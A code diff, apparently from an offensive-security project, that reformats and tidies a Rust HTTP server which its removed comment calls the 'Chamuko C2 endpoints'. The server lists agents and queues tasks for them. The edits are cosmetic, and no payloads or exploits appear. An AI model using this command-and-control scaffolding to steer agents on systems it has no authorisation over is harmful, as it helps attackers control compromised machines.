@@ -1,5 +1,3 @@
-//! Tiny HTTP server exposing the Chamuko C2 endpoints.
-
 use std::sync::{Arc, Mutex};
 
 use tiny_http::{Header, Method, Response, Server};
@@ -13,7 +11,8 @@ use crate::state::State;
 const JSON: &str = "application/json";
 
 pub fn run(state: Arc<Mutex<State>>, listen: &str) -> std::io::Result<()> {
-    let server = Server::http(listen).map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
+    let server =
+        Server::http(listen).map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
     eprintln!("[c2] listening on http://{listen}");
 
     for mut request in server.incoming_requests() {
@@ -23,14 +22,11 @@ pub fn run(state: Arc<Mutex<State>>, listen: &str) -> std::io::Result<()> {
         let _ = request.as_reader().read_to_string(&mut body);
 
         let (status, response_body) = handle(&state, &method, &url, &body);
-        let content_type = Header::from_bytes(&b"Content-Type"[..], JSON.as_bytes()).unwrap();
-        let mut resp = Response::from_string(response_body)
+        let content_type =
+            Header::from_bytes(&b"Content-Type"[..], JSON.as_bytes()).unwrap();
+        let resp = Response::from_string(response_body)
             .with_status_code(status)
             .with_header(content_type);
-        if status != 200 {
-            // tiny_http requires the status text to be set for non-200.
-            resp = resp.with_status_code(status);
-        }
         let _ = request.respond(resp);
     }
     Ok(())
@@ -114,10 +110,6 @@ fn handle_enqueue(state: &Arc<Mutex<State>>, body: &str) -> (i32, String) {
     }
 }
 
-fn json_err(msg: &str) -> String {
-    format!(r#"{{"error":"{}"}}"#, msg.replace('"', "\\\""))
-}
-
 fn handle_agents(state: &Arc<Mutex<State>>) -> (i32, String) {
     let s = state.lock().unwrap();
     let mut out = Vec::new();
@@ -133,4 +125,8 @@ fn handle_agents(state: &Arc<Mutex<State>>) -> (i32, String) {
         }));
     }
     (200, serde_json::to_string(&out).unwrap_or_else(|_| "[]".to_string()))
+}
+
+fn json_err(msg: &str) -> String {
+    format!(r#"{{"error":"{}"}}"#, msg.replace('"', "\\\""))
 }
